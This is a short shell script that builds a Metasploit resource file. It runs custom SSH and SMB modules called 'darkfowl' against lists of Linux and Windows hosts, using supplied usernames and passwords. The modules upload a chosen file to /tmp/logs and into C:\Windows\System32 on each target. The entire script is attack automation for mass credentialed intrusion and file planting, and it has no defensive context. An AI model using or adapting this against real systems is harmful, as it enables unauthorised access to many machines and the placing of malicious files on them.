Linux_TARGETS=`cat $1 | grep "hosts:" | cut -d' ' -f2-`
Linux_FILE=`cat $1 | grep "file:" | cut -d' ' -f2-`
Linux_USERNAME=`cat $1 | grep "username:" | cut -d' ' -f2-`
Linux_PASSWORD=`cat $1 | grep "password:" | cut -d' ' -f2-`

Windows_TARGETS=`cat $2 | grep "hosts:" | cut -d' ' -f2-`
Windows_FILE=`cat $2 | grep "file:" | cut -d' ' -f2-`
Windows_USERNAME=`cat $2 | grep "username:" | cut -d' ' -f2-`
Windows_PASSWORD=`cat $2 | grep "password:" | cut -d' ' -f2-`
echo -e "
use exploit/darkfowl_ssh
set RHOSTS $Linux_TARGETS
set LOCALLOCATION $Linux_FILE
set REMOTELOCATION /tmp/logs
set USERNAME $Linux_USERNAME
set PASSWORD $Linux_PASSWORD
set disablepayloadhandler true
run
use exploit/darkfowl_smb
set RHOSTS $Windows_TARGETS
set LOCALLOCATION $Windows_FILE
set REMOTELOCATION C:\\Windows\\System32
set USERNAME $Windows_USERNAME
set PASSWORD $Windows_PASSWORD
run
" > test.rc